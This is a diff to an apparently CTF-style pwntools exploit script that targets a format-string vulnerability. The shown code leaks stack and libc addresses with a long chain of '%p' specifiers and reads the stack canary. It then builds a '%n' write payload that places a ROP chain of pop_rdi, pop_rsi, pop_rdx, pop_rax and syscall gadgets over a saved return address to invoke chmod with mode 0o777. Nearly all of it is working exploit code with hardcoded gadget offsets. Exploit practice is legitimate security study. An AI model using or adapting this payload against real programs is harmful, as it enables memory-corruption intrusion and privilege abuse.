@@ -41,6 +41,19 @@ continue
 
 io = start()
 
+def format_string(x):
+    print("old str")
+    print(x)  
+    x1 = x.split("$")
+    new_str=""
+    for i in range(len(x1)-1):
+        s1=x1[i]
+        new_str=new_str+s1[:-2]
+        # print(s1[:-2])
+    new_str += x1[len(x1)-1]
+    print("new_str")
+    print(new_str)
+
 # exploit = f'%p'+' %p'*159
 exploit = f'%p'+' %p'*159
 print("payload 1 start")
@@ -59,8 +72,9 @@ libc_base = leaked_libc_func_int - 0x1ed723
 print(f"libc_base : 0x{libc_base:x}")
 
 leaked_rbp = leak[156]
-print(f"leaked rbp : {leaked_rbp}")
 rbp_main = int(leaked_rbp, 16)  
+rbp_main_updated = rbp_main - 8  
+print(f"rbp_main_updated : 0x{rbp_main_updated:x}")
 rbp_func = rbp_main - 344 
 print(f"leaked rbp func : {hex(rbp_func)}")
 leaked_ret = rbp_func + 8
@@ -83,7 +97,7 @@ print(f"leaked_canary : 0x{leaked_canary:x}")
 # print(f"leaked_func_rip : {leaked_func_rip:x}")
 
 base = libc_base
-rip_func =  rip_func_addr
+rip_func = rip_func_addr
 pop_rdi = base+0x23b6a 
 pop_rsi = base+0x2601f 
 pop_rdx = base+0x142c92 
@@ -91,7 +105,7 @@ pop_rax = base+0x36174
 syscall = base+0x2284d  
 # offset position of canary is 151
 print("2nd payload start")
-# exit_loc : p64(base + 0x578c8).ljust(8, b"\x00"),
+
 
 # p2 = b"A"*3 + fmtstr_payload(30, {
 #     rip_func : p64(pop_rdi).ljust(8, b"\x00"),
@@ -105,11 +119,22 @@ print("2nd payload start")
 #     rip_func + 64 : p64(syscall).ljust(8, b"\x00")
 #     }, numbwritten=64,  write_size='short', strategy='fast')
 
-position=48
+# p2 = b"A"*3 + fmtstr_payload(30, {
+#      rip_func : p64(pop_rdi).ljust(8, b"\x00"),
+#      rip_func + 8 : p64(base + 0x1eb1f3).ljust(8, b"\x00"),
+#     }, numbwritten=64,  write_size='short', strategy='fast')
+
+# format_string(p2.decode())
+# print(p64(rip_func).ljust(8, b"\x00"))    
+# print(p64(base+0x1eb1f3).ljust(8, b"\x00"))    
+
+# print(p2_1)
+# position=48
 # position=30
 # position = 31+8-1
 # p2 = b"A"*3 + b"%c"*(position-1)+b"%n" +p64(rip_func)+p64(pop_rdi)+p64(rip_func+8)+p64(base+0x1eb1f3)+p64(rip_func+16)+p64(pop_rsi)+p64(rip_func+24)+p64(0o777)+p64(rip_func+32)+p64(pop_rdx)+p64(rip_func+40)+p64(0)+p64(rip_func+48)+p64(pop_rax)+p64(rip_func+56)+p64(0x5a)+p64(rip_func+64)+p64(syscall)
 
+position=48
 p2 = b"A"*3 + b"%c"*(position-1)+b"%n"
 p2 += p64(rip_func)
 p2 += p64(pop_rdi).ljust(8, b"\x00")
